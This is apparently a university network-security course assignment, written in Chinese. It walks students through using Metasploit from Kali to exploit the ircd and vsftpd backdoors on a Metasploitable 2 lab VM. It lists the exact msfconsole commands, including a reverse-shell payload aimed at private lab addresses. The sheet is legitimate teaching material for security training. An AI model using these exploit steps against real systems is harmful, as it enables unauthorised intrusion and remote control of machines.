
### 期末報告
```
1. 期末報告已在作業區公告, 完成後可上傳
2. 把截圖貼在 word 檔案裡, 分別描述, 請以報告的格式撰寫
3. kali 和 meta 可用同一台機器執行
4. 允許在學校圖資處的 雲端機器中執行
```
### 作業說明
```
說明
1. 參考 CSC Lab4: https://github.com/jumbokh/Network-class/blob/main/refers/lab4-instruction.pdf
2. 使用 metasploit-framework :
     a. ircd
     b. vsftpd
    在 metasploitable vm 上留下你的學號的檔名, 如:
     999999999.irc
     999999999.ftp
截圖項目:
    1. kali linux 登入
    2. metasploitable 2 登入
    3. 兩個系統的 ifconfig   (網路項目)
    4. 以 msfconsole 分別使用 irc 及 vsftp 後門漏洞模組登入metasploitable2 主機
        留下檔案, 最後顯示 ls -l 檔案顯示
    5. 在 metasploitable2 主機上打: sudo find / -name '99999999.*' -print
        (將 99999999 換成你的學號)

*** 登入後指令, 參考 page 11, 12
1. search ircd
2. use 0
3 set RHOST 10.0.2.6
4. set payload cmd/unix/reverse
5. set LHOST 10.0.2.5
6. exploit
等到 session open 後,
whoami
pwd
touch <your id>.ircd
ctrl-c
exit
2. vsftpd
1. search vsftpd
2. use 1
3. set RHOST 10.0.2.6
4. set payload cmd/unix/interact
5. set LHOST 10.0.2.5
6. exploit
等候 session open... 
whoami
pwd
touch <your id>.vsftpd
ctrl-c
exit

```
